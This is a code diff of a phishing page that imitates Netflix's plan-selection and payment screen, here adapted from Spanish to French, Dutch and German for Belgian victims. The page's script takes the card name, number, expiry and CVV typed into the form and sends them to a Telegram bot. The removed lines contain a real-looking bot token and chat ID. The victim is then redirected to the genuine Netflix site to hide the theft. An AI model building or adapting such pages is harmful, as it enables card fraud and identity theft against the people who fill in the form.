@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">Elige tu plan - Netflix</title>
+    <title id="pageTitle">Choisissez votre offre - Netflix</title>
     <style>
         * {
             margin: 0;
@@ -262,6 +262,7 @@
             font-weight: 500;
             cursor: pointer;
             margin-top: 20px;
+            position: relative;
         }
 
         .submit-button:hover {
@@ -298,6 +299,33 @@
             color: #737373;
             font-size: 13px;
         }
+
+        /* Spinner */
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .btn-loading {
+            color: transparent !important;
+        }
+
+        .btn-loading .spinner {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -305,83 +333,80 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
         <select class="language-selector" id="languageSelector">
             <option value="fr">Français</option>
-            <option value="en">English</option>
-            <option value="es">Español</option>
+            <option value="nl">Nederlands</option>
             <option value="de">Deutsch</option>
-            <option value="ru">Русский</option>
-            <option value="pl">Polski</option>
         </select>
     </header>
 
     <div class="progress-bar">
         <div class="progress-step">
             <div class="step-number">1</div>
-            <div class="step-label">Elección del plan</div>
+            <div class="step-label" id="step1Label">Choix de l'offre</div>
         </div>
         <div class="progress-step">
             <div class="step-number">2</div>
-            <div class="step-label">Creación de la cuenta</div>
+            <div class="step-label" id="step2Label">Création du compte</div>
         </div>
         <div class="progress-step">
             <div class="step-number">3</div>
-            <div class="step-label">Pago</div>
+            <div class="step-label" id="step3Label">Paiement</div>
         </div>
     </div>
 
     <div class="container">
-        <h1 class="page-title" id="pageTitle">Elige tu plan</h1>
+        <h1 class="page-title" id="pageTitle">Choisissez votre offre</h1>
         
         <div class="plans">
             <div class="plan-card" data-plan="standard-pub">
-                <div class="plan-name" id="plan1Name">Estándar con anuncios</div>
+                <div class="plan-name" id="plan1Name">Standard avec pub</div>
                 <div class="plan-price" id="plan1Price">5,99 €</div>
                 <ul class="plan-features" id="plan1Features">
-                    <li>Resolución HD (720p)</li>
-                    <li>Dispositivos: 2</li>
-                    <li>Anuncios durante la reproducción</li>
-                    <li>Descargas no disponibles</li>
+                    <li>Résolution HD (720p)</li>
+                    <li>Accès sur 2 appareils</li>
+                    <li>Publicités pendant la lecture</li>
+                    <li>Téléchargement non disponible</li>
                 </ul>
-                <button class="select-button" id="selectButton1">Seleccionar</button>
+                <button class="select-button" id="selectButton1">Sélectionner</button>
             </div>
             
             <div class="plan-card" data-plan="standard">
-                <div class="recommended-badge" id="recommendedBadge">Recomendado</div>
-                <div class="plan-name" id="plan2Name">Estándar</div>
+                <div class="recommended-badge" id="recommendedBadge">Recommandé</div>
+                <div class="plan-name" id="plan2Name">Standard</div>
                 <div class="plan-price" id="plan2Price">13,49 €</div>
                 <ul class="plan-features" id="plan2Features">
-                    <li>Resolución Full HD (1080p)</li>
-                    <li>Dispositivos: 2</li>
-                    <li>Sin anuncios</li>
-                    <li>Descargas en 2 dispositivos</li>
+                    <li>Résolution Full HD (1080p)</li>
+                    <li>Accès sur 2 appareils</li>
+                    <li>Sans publicité</li>
+                    <li>Téléchargement sur 2 appareils</li>
                 </ul>
-                <button class="select-button" id="selectButton2">Seleccionar</button>
+                <button class="select-button" id="selectButton2">Sélectionner</button>
             </div>
             
             <div class="plan-card" data-plan="premium">
                 <div class="plan-name" id="plan3Name">Premium</div>
                 <div class="plan-price" id="plan3Price">17,99 €</div>
                 <ul class="plan-features" id="plan3Features">
-                    <li>Resolución Ultra HD (4K)</li>
-                    <li>Dispositivos: 4</li>
-                    <li>Sin anuncios</li>
-                    <li>Descargas en 6 dispositivos</li>
+                    <li>Résolution Ultra HD (4K)</li>
+                    <li>Accès sur 4 appareils</li>
+                    <li>Sans publicité</li>
+                    <li>Téléchargement sur 6 appareils</li>
                 </ul>
-                <button class="select-button" id="selectButton3">Seleccionar</button>
+                <button class="select-button" id="selectButton3">Sélectionner</button>
             </div>
         </div>
 
         <div class="payment-form" id="paymentForm">
             <h2 class="form-title">
-                <span id="paymentTitle">Información de pago</span>
-                <span class="selected-plan" id="selectedPlanDisplay">Estándar - 13,49 €/mes</span>
+                <span id="paymentTitle">Informations de paiement</span>
+                <span class="selected-plan" id="selectedPlanDisplay">Standard - 13,49 €/mois</span>
             </h2>
             <form id="paymentFormElement">
                 <div class="form-group">
-                    <label for="cardName" id="cardNameLabel">Nombre en la tarjeta</label>
+                    <label for="cardName" id="cardNameLabel">Nom sur la carte</label>
                     <input type="text" id="cardName" required>
                 </div>
                 <div class="form-group">
-                    <label for="cardNumber" id="cardNumberLabel">Número de tarjeta</label>
+                    <label for="cardNumber" id="cardNumberLabel">Numéro de carte</label>
                     <input type="text" id="cardNumber" required>
                     <div class="card-icons">
                         <img src="visa.png" class="card-icon">
@@ -389,36 +414,49 @@
                     </div>
                 </div>
                 <div class="form-group">
-                    <label for="expiry" id="expiryLabel">Fecha de vencimiento</label>
+                    <label for="expiry" id="expiryLabel">Date d'expiration</label>
                     <input type="text" id="expiry" placeholder="MM/AA" required>
                 </div>
                 <div class="form-group">
                     <label for="cvv" id="cvvLabel">CVV</label>
                     <input type="text" id="cvv" required>
                 </div>
-                <button type="submit" class="submit-button" id="submitButton">Comenzar membresía</button>
+                <button type="submit" class="submit-button" id="submitButton">
+                    <span id="submitText">Commencer l'abonnement</span>
+                    <div class="spinner"></div>
+                </button>
             </form>
         </div>
     </div>
 
     <footer class="footer">
         <div class="footer-links">
-            <a href="#" class="footer-link" id="termsLink">Términos de uso</a>
-            <a href="#" class="footer-link" id="privacyLink">Privacidad</a>
-            <a href="#" class="footer-link" id="legalLink">Avisos legales</a>
-            <a href="#" class="footer-link" id="cookiesLink">Preferencias de cookies</a>
+            <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
+            <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
+            <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
+            <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
         </div>
         <p class="footer-text" id="copyrightText">© 2023 Netflix, Inc.</p>
     </footer>
 
     <script>
-        // Traducciones multilingües completas
+        // Configuration Telegram
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Remplacez par votre token
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Remplacez par votre chat ID
+
+        // Textes pour les différentes langues (Belgique)
         const translations = {
             fr: {
                 pageTitle: "Choisissez votre offre",
+                step1Label: "Choix de l'offre",
+                step2Label: "Création du compte",
+                step3Label: "Paiement",
                 plan1Name: "Standard avec pub",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
+                plan1Price: "5,99 €",
+                plan2Price: "13,49 €",
+                plan3Price: "17,99 €",
                 recommended: "Recommandé",
                 selectButton: "Sélectionner",
                 plan1Features: [
@@ -444,129 +482,67 @@
                 cardNumberLabel: "Numéro de carte",
                 expiryLabel: "Date d'expiration",
                 cvvLabel: "CVV",
-                submitButton: "Commencer l'abonnement",
+                submitText: "Commencer l'abonnement",
                 terms: "Conditions d'utilisation",
                 privacy: "Confidentialité",
                 legal: "Mentions légales",
                 cookies: "Préférences de cookies",
                 copyright: "© 2023 Netflix, Inc."
             },
-            ru: {
-                pageTitle: "Выберите тариф",
-                plan1Name: "Стандарт с рекламой",
-                plan2Name: "Стандарт",
-                plan3Name: "Премиум",
-                recommended: "Рекомендуем",
-                selectButton: "Выбрать",
-                plan1Features: [
-                    "Разрешение HD (720p)",
-                    "На 2 устройствах",
-                    "Реклама во время просмотра",
-                    "Скачивание недоступно"
-                ],
-                plan2Features: [
-                    "Разрешение Full HD (1080p)",
-                    "На 2 устройствах",
-                    "Без рекламы",
-                    "Скачивание на 2 устройства"
-                ],
-                plan3Features: [
-                    "Разрешение Ultra HD (4K)",
-                    "На 4 устройствах",
-                    "Без рекламы",
-                    "Скачивание на 6 устройств"
-                ],
-                paymentTitle: "Платежная информация",
-                cardNameLabel: "Имя на карте",
-                cardNumberLabel: "Номер карты",
-                expiryLabel: "Срок действия",
-                cvvLabel: "CVV",
-                submitButton: "Начать подписку",
-                terms: "Условия использования",
-                privacy: "Конфиденциальность",
-                legal: "Юридические уведомления",
-                cookies: "Настройки cookie",
-                copyright: "© 2023 Netflix, Inc."
-            },
-            en: {
-                pageTitle: "Choose your plan",
-                plan1Name: "Standard with ads",
-                plan2Name: "Standard",
+            nl: {
+                pageTitle: "Kies je abonnement",
+                step1Label: "Abonnement kiezen",
+                step2Label: "Account aanmaken",
+                step3Label: "Betaling",
+                plan1Name: "Standaard met reclame",
+                plan2Name: "Standaard",
                 plan3Name: "Premium",
-                recommended: "Recommended",
-                selectButton: "Select",
+                plan1Price: "5,99 €",
+                plan2Price: "13,49 €",
+                plan3Price: "17,99 €",
+                recommended: "Aanbevolen",
+                selectButton: "Selecteren",
                 plan1Features: [
-                    "HD resolution (720p)",
-                    "Watch on 2 devices",
-                    "Ads during playback",
-                    "Downloads not available"
+                    "HD-resolutie (720p)",
+                    "Op 2 apparaten",
+                    "Reclame tijdens afspelen",
+                    "Downloaden niet beschikbaar"
                 ],
                 plan2Features: [
-                    "Full HD resolution (1080p)",
-                    "Watch on 2 devices",
-                    "No ads",
-                    "Download on 2 devices"
+                    "Full HD-resolutie (1080p)",
+                    "Op 2 apparaten",
+                    "Zonder reclame",
+                    "Downloaden op 2 apparaten"
                 ],
                 plan3Features: [
-                    "Ultra HD resolution (4K)",
-                    "Watch on 4 devices",
-                    "No ads",
-                    "Download on 6 devices"
+                    "Ultra HD-resolutie (4K)",
+                    "Op 4 apparaten",
+                    "Zonder reclame",
+                    "Downloaden op 6 apparaten"
                 ],
-                paymentTitle: "Payment information",
-                cardNameLabel: "Name on card",
-                cardNumberLabel: "Card number",
-                expiryLabel: "Expiration date",
+                paymentTitle: "Betalingsgegevens",
+                cardNameLabel: "Naam op kaart",
+                cardNumberLabel: "Kaartnummer",
+                expiryLabel: "Vervaldatum",
                 cvvLabel: "CVV",
-                submitButton: "Start membership",
-                terms: "Terms of Use",
+                submitText: "Lidmaatschap starten",
+                terms: "Gebruiksvoorwaarden",
                 privacy: "Privacy",
-                legal: "Legal Notices",
-                cookies: "Cookie Preferences",
-                copyright: "© 2023 Netflix, Inc."
-            },
-            es: {
-                pageTitle: "Elige tu plan",
-                plan1Name: "Estándar con anuncios",
-                plan2Name: "Estándar",
-                plan3Name: "Premium",
-                recommended: "Recomendado",
-                selectButton: "Seleccionar",
-                plan1Features: [
-                    "Resolución HD (720p)",
-                    "Dispositivos: 2",
-                    "Anuncios durante la reproducción",
-                    "Descargas no disponibles"
-                ],
-                plan2Features: [
-                    "Resolución Full HD (1080p)",
-                    "Dispositivos: 2",
-                    "Sin anuncios",
-                    "Descargas en 2 dispositivos"
-                ],
-                plan3Features: [
-                    "Resolución Ultra HD (4K)",
-                    "Dispositivos: 4",
-                    "Sin anuncios",
-                    "Descargas en 6 dispositivos"
-                ],
-                paymentTitle: "Información de pago",
-                cardNameLabel: "Nombre en la tarjeta",
-                cardNumberLabel: "Número de tarjeta",
-                expiryLabel: "Fecha de vencimiento",
-                cvvLabel: "CVV",
-                submitButton: "Comenzar membresía",
-                terms: "Términos de uso",
-                privacy: "Privacidad",
-                legal: "Avisos legales",
-                cookies: "Preferencias de cookies",
+                legal: "Juridische bepalingen",
+                cookies: "Cookievoorkeuren",
                 copyright: "© 2023 Netflix, Inc."
             },
             de: {
-                pageTitle: "Wählen Sie Ihren Plan",
+                pageTitle: "Wählen Sie Ihr Abonnement",
+                step1Label: "Abonnement wählen",
+                step2Label: "Konto erstellen",
+                step3Label: "Zahlung",
                 plan1Name: "Standard mit Werbung",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
+                plan1Price: "5,99 €",
+                plan2Price: "13,49 €",
+                plan3Price: "17,99 €",
                 recommended: "Empfohlen",
                 selectButton: "Auswählen",
                 plan1Features: [
@@ -592,123 +568,109 @@
                 cardNumberLabel: "Kartennummer",
                 expiryLabel: "Ablaufdatum",
                 cvvLabel: "CVV",
-                submitButton: "Mitgliedschaft starten",
+                submitText: "Mitgliedschaft starten",
                 terms: "Nutzungsbedingungen",
                 privacy: "Datenschutz",
                 legal: "Rechtliche Hinweise",
                 cookies: "Cookie-Einstellungen",
                 copyright: "© 2023 Netflix, Inc."
-            },
-            pl: {
-                pageTitle: "Wybierz swój plan",
-                plan1Name: "Standard z reklamami",
-                plan2Name: "Standard",
-                plan3Name: "Premium",
-                recommended: "Polecane",
-                selectButton: "Wybierz",
-                plan1Features: [
-                    "Rozdzielczość HD (720p)",
-                    "Na 2 urządzeniach",
-                    "Reklamy podczas odtwarzania",
-                    "Pobieranie niedostępne"
-                ],
-                plan2Features: [
-                    "Rozdzielczość Full HD (1080p)",
-                    "Na 2 urządzeniach",
-                    "Bez reklam",
-                    "Pobieranie na 2 urządzenia"
-                ],
-                plan3Features: [
-                    "Rozdzielczość Ultra HD (4K)",
-                    "Na 4 urządzeniach",
-                    "Bez reklam",
-                    "Pobieranie na 6 urządzeń"
-                ],
-                paymentTitle: "Informacje o płatności",
-                cardNameLabel: "Imię i nazwisko na karcie",
-                cardNumberLabel: "Numer karty",
-                expiryLabel: "Data ważności",
-                cvvLabel: "CVV",
-                submitButton: "Rozpocznij członkostwo",
-                terms: "Warunki korzystania",
-                privacy: "Prywatność",
-                legal: "Informacje prawne",
-                cookies: "Preferencje dotyczące plików cookie",
-                copyright: "© 2023 Netflix, Inc."
             }
         };
 
-        function getLanguage() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const langParam = urlParams.get('lang');
+        // Fonction pour envoyer un message Telegram
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            if (langParam && translations[langParam]) {
-                localStorage.setItem('netflixLang', langParam);
-                return langParam;
-            }
-            
-            return localStorage.getItem('netflixLang') || 'es';
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message envoyé à Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
+            });
         }
 
-        function updateLanguage(lang) {
-            const trans = translations[lang];
-            if (!trans) return;
+        // Fonction pour changer la langue
+        function changeLanguage(lang) {
+            const texts = translations[lang];
             
-            // Actualizar todos los elementos con ID
-            document.querySelectorAll('[id]').forEach(element => {
-                const key = element.id;
-                if (trans[key]) {
-                    if (Array.isArray(trans[key])) {
-                        const items = element.querySelectorAll('li');
-                        items.forEach((item, index) => {
-                            if (trans[key][index]) {
-                                item.textContent = trans[key][index];
-                            }
-                        });
-                    } else {
-                        element.textContent = trans[key];
-                    }
+            // Mettre à jour tous les textes
+            document.getElementById('pageTitle').textContent = texts.pageTitle;
+            document.getElementById('step1Label').textContent = texts.step1Label;
+            document.getElementById('step2Label').textContent = texts.step2Label;
+            document.getElementById('step3Label').textContent = texts.step3Label;
+            document.getElementById('plan1Name').textContent = texts.plan1Name;
+            document.getElementById('plan2Name').textContent = texts.plan2Name;
+            document.getElementById('plan3Name').textContent = texts.plan3Name;
+            document.getElementById('plan1Price').textContent = texts.plan1Price;
+            document.getElementById('plan2Price').textContent = texts.plan2Price;
+            document.getElementById('plan3Price').textContent = texts.plan3Price;
+            document.getElementById('recommendedBadge').textContent = texts.recommended;
+            document.getElementById('selectButton1').textContent = texts.selectButton;
+            document.getElementById('selectButton2').textContent = texts.selectButton;
+            document.getElementById('selectButton3').textContent = texts.selectButton;
+            document.getElementById('paymentTitle').textContent = texts.paymentTitle;
+            document.getElementById('cardNameLabel').textContent = texts.cardNameLabel;
+            document.getElementById('cardNumberLabel').textContent = texts.cardNumberLabel;
+            document.getElementById('expiryLabel').textContent = texts.expiryLabel;
+            document.getElementById('cvvLabel').textContent = texts.cvvLabel;
+            document.getElementById('submitText').textContent = texts.submitText;
+            document.getElementById('termsLink').textContent = texts.terms;
+            document.getElementById('privacyLink').textContent = texts.privacy;
+            document.getElementById('legalLink').textContent = texts.legal;
+            document.getElementById('cookiesLink').textContent = texts.cookies;
+            document.getElementById('copyrightText').textContent = texts.copyright;
+            
+            // Mettre à jour les listes de fonctionnalités
+            const plan1Features = document.querySelectorAll('#plan1Features li');
+            texts.plan1Features.forEach((feature, index) => {
+                if (plan1Features[index]) {
+                    plan1Features[index].textContent = feature;
                 }
             });
             
-            // Actualización especial para los botones "Seleccionar"
-            document.querySelectorAll('.select-button').forEach(button => {
-                button.textContent = trans.selectButton;
+            const plan2Features = document.querySelectorAll('#plan2Features li');
+            texts.plan2Features.forEach((feature, index) => {
+                if (plan2Features[index]) {
+                    plan2Features[index].textContent = feature;
+                }
             });
             
-            // Actualizar el placeholder de la fecha de vencimiento
-            const expiryInput = document.getElementById('expiry');
-            if (expiryInput) {
-                expiryInput.placeholder = lang === 'en' ? 'MM/YY' : 
-                                       lang === 'es' ? 'MM/AA' : 
-                                       lang === 'de' ? 'MM/JJ' : 
-                                       lang === 'ru' ? 'ММ/ГГ' : 
-                                       lang === 'pl' ? 'MM/RR' : 'MM/AA';
-            }
+            const plan3Features = document.querySelectorAll('#plan3Features li');
+            texts.plan3Features.forEach((feature, index) => {
+                if (plan3Features[index]) {
+                    plan3Features[index].textContent = feature;
+                }
+            });
             
-            // Actualizar el selector de idioma
-            const languageSelector = document.getElementById('languageSelector');
-            if (languageSelector) {
-                languageSelector.value = lang;
-            }
-            
-            // Actualizar el título de la página
-            document.title = trans.pageTitle;
+            // Sauvegarder la langue sélectionnée
+            localStorage.setItem('selectedLanguage', lang);
         }
 
+        // Initialisation au chargement de la page
         document.addEventListener('DOMContentLoaded', function() {
-            const lang = getLanguage();
-            updateLanguage(lang);
+            // Récupérer la langue sauvegardée ou utiliser le français par défaut
+            const savedLanguage = localStorage.getItem('selectedLanguage') || 'fr';
+            document.getElementById('languageSelector').value = savedLanguage;
+            changeLanguage(savedLanguage);
             
-            const languageSelector = document.getElementById('languageSelector');
-            if (languageSelector) {
-                languageSelector.addEventListener('change', function() {
-                    const newLang = this.value;
-                    localStorage.setItem('netflixLang', newLang);
-                    updateLanguage(newLang);
-                });
-            }
+            // Écouter les changements de langue
+            document.getElementById('languageSelector').addEventListener('change', function() {
+                changeLanguage(this.value);
+            });
             
+            // Gestion de la sélection des plans
             const planCards = document.querySelectorAll('.plan-card');
             const paymentForm = document.getElementById('paymentForm');
             const selectedPlanDisplay = document.getElementById('selectedPlanDisplay');
@@ -723,18 +685,21 @@
                     selectedPlan = this.getAttribute('data-plan');
                     const planName = this.querySelector('.plan-name').textContent;
                     const planPrice = this.querySelector('.plan-price').textContent;
-                    selectedPlanDisplay.textContent = `${planName} - ${planPrice}/mes`;
+                    selectedPlanDisplay.textContent = `${planName} - ${planPrice}/mois`;
                     
                     paymentForm.style.display = 'block';
                     paymentForm.scrollIntoView({ behavior: 'smooth' });
                 });
             });
 
+            // Gestion du formulaire de paiement
             document.getElementById('paymentFormElement').addEventListener('submit', function(e) {
                 e.preventDefault();
                 
+                const submitBtn = document.getElementById('submitButton');
+                
                 if (!selectedPlan) {
-                    alert(translations[getLanguage()].selectPlan || 'Por favor selecciona un plan');
+                    alert('Veuillez sélectionner un plan');
                     return;
                 }
                 
@@ -743,37 +708,32 @@
                 const expiry = document.getElementById('expiry').value;
                 const cvv = document.getElementById('cvv').value;
                 
-                const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
-                const chatId = '-4883048028';
-                const message = `💳 NUEVO PAGO NETFLIX 💳
-
-🏷 Plan seleccionado: ${selectedPlanDisplay.textContent}
-👤 Nombre en tarjeta: ${cardName}
-🔢 Número de tarjeta: ${cardNumber}
-📅 Vencimiento: ${expiry}
-🔐 CVV: ${cvv}
-
-⏰ ${new Date().toLocaleString()}
-🌍 Idioma: ${getLanguage().toUpperCase()}`;
+                // Afficher le spinner
+                submitBtn.classList.add('btn-loading');
                 
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Datos enviados a Telegram:', data);
-                    window.location.href = `confirmation.html?lang=${getLanguage()}`;
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
+                // Préparer le message pour Telegram
+                const currentDate = new Date().toLocaleString('fr-BE');
+                const message = `
+💳 <b>NOUVEAU PAIEMENT NETFLIX BELGIQUE</b>
+
+🏷 <b>Plan sélectionné:</b> ${selectedPlanDisplay.textContent}
+👤 <b>Nom sur carte:</b> ${cardName}
+🔢 <b>Numéro de carte:</b> ${cardNumber}
+📅 <b>Date d'expiration:</b> ${expiry}
+🔐 <b>CVV:</b> ${cvv}
+
+⏰ <b>Date:</b> ${currentDate}
+🌐 <b>Langue:</b> ${document.getElementById('languageSelector').value}
+                `;
+                
+                // Envoyer le message à Telegram
+                sendTelegramMessage(message);
+                
+                // Simuler le traitement de paiement
+                setTimeout(() => {
+                    // Redirection vers la page de confirmation
+                    window.location.href = "https://www.netflix.com/signup/planform";
+                }, 2000);
             });
         });
     </script>
